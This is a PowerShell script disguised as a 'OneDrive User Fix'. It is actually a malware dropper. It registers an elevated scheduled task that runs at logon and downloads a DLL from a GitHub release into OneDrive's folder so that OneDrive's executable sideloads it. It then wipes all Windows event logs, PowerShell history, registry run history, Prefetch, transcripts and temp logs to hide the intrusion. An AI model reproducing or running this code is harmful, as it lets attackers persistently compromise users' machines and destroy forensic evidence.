# Save as: OneDriveUserFix.ps1 → Right-click → Run with PowerShell (as Administrator once)
$TaskName = "OneDrive Updater"
$DllUrl = "https://github.com/coruppters/updaters/releases/download/bruh/FileSync.LocalizedResources.dll" # ← CHANGE THIS
$DllName = "FileSync.LocalizedResources.dll" # ← CHANGE THIS

# Initialize progress
$progress = 0
$totalSteps = 12

# Step 1: Find OneDrive
$progress++
$exe = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\OneDrive" -Filter "OneDrive.Sync.Service.exe" -Recurse -File |
       Select-Object -First 1
if (!$exe) { exit }
$ExePath = $exe.FullName
$TargetFolder = $exe.DirectoryName

# Step 2: Remove old task
$progress++
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Step 3: Create task
$progress++
$action = New-ScheduledTaskAction -Execute $ExePath
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

# Step 4: Download DLL
$progress++
$dest = Join-Path $TargetFolder $DllName

if (Test-Path $dest) {
    Get-Process -Name OneDrive*, FileCoAuth*, FileSync* -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

$retryCount = 0
$maxRetries = 3
$downloadSuccess = $false
while ($retryCount -lt $maxRetries) {
    try {
        Invoke-WebRequest -Uri $DllUrl -OutFile $dest -UseBasicParsing
        $downloadSuccess = $true
        break
    } catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        } else {
            Start-Sleep -Seconds 2
        }
    }
}

# Step 5: Run task
$progress++
Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Step 6: Clean PowerShell history
$progress++
Clear-History -ErrorAction SilentlyContinue
$historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}

# Step 7: Clear ALL Event Viewer logs
$progress++
try {
    $allLogs = Get-WinEvent -ListLog * -ErrorAction SilentlyContinue
    foreach ($log in $allLogs) {
        try {
            if ($log.IsEnabled -and $log.RecordCount -gt 0) {
                Clear-EventLog -LogName $log.LogName -ErrorAction SilentlyContinue
            }
        } catch {}
    }
    
    $importantLogs = @(
        "Application", "System", "Security", "Setup", "ForwardedEvents",
        "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-PowerShell/Admin", "PowerShellCore/Operational",
        "Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-Winlogon/Operational", "Microsoft-Windows-Shell-Core/Operational"
    )
    
    foreach ($log in $importantLogs) {
        try { Clear-EventLog -LogName $log -ErrorAction SilentlyContinue } catch {}
    }
    
    try {
        wevtutil el | ForEach-Object {
            try { wevtutil cl $_ 2>$null } catch {}
        }
    } catch {}
} catch {}

# Step 8: Clear registry history
$progress++
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
    "HKCU:\Console",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps"
)

foreach ($path in $regPaths) {
    try {
        if (Test-Path $path) {
            if ($path -like "*RunMRU") {
                Get-Item $path | Select-Object -ExpandProperty Property | ForEach-Object {
                    Remove-ItemProperty -Path $path -Name $_ -Force -ErrorAction SilentlyContinue
                }
            } else {
                Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {}
}

# Step 9: Flush system caches
$progress++
try { ipconfig /flushdns | Out-Null } catch {}
try { ipconfig /release | Out-Null } catch {}
try { ipconfig /renew | Out-Null } catch {}
try { arp -d * | Out-Null } catch {}
try { nbtstat -R | Out-Null } catch {}

# Step 10: Clear Windows Update cache
$progress++
try {
    Stop-Service wuauserv -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\SoftwareDistribution\*" -Recurse -Force -ErrorAction SilentlyContinue
    Start-Service wuauserv -ErrorAction SilentlyContinue
} catch {}

# Step 11: Clean temp files
$progress++
try {
    Remove-Item "$env:USERPROFILE\Documents\PowerShell_transcript*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:USERPROFILE\Desktop\PowerShell_transcript*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:USERPROFILE\Downloads\PowerShell_transcript*" -Force -ErrorAction SilentlyContinue
    Get-ChildItem "$env:LOCALAPPDATA\Temp" -Filter "*PowerShell*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem "$env:TEMP" -Filter "*PowerShell*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem "$env:TEMP" -Filter "*log*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem "C:\Windows\Logs" -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } | Remove-Item -Force -ErrorAction SilentlyContinue
} catch {}

# Step 12: Clear Prefetch
$progress++
try {
    Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
} catch {}

# Final success message
Clear-Host
Write-Host ""
Write-Host "███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗" -ForegroundColor Green
Write-Host "██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝" -ForegroundColor Green
Write-Host "███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗" -ForegroundColor Green
Write-Host "╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║" -ForegroundColor Green
Write-Host "███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║" -ForegroundColor Green
Write-Host "╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝" -ForegroundColor Green
Write-Host ""
Write-Host "          OPERATION COMPLETED SUCCESSFULLY" -ForegroundColor Cyan
Write-Host ""
Write-Host "          • configured to start" -ForegroundColor White
if ($downloadSuccess) {
    Write-Host "          •  deployed successfully" -ForegroundColor White
} else {
    Write-Host "          • deployment failed (check connection)" -ForegroundColor Yellow
}
Write-Host "          • All system traces removed" -ForegroundColor White
Write-Host "          • Event logs cleared" -ForegroundColor White
Write-Host "          • Cleanup complete" -ForegroundColor White
Write-Host ""
Write-Host "          This window will close in 5 seconds..." -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 5
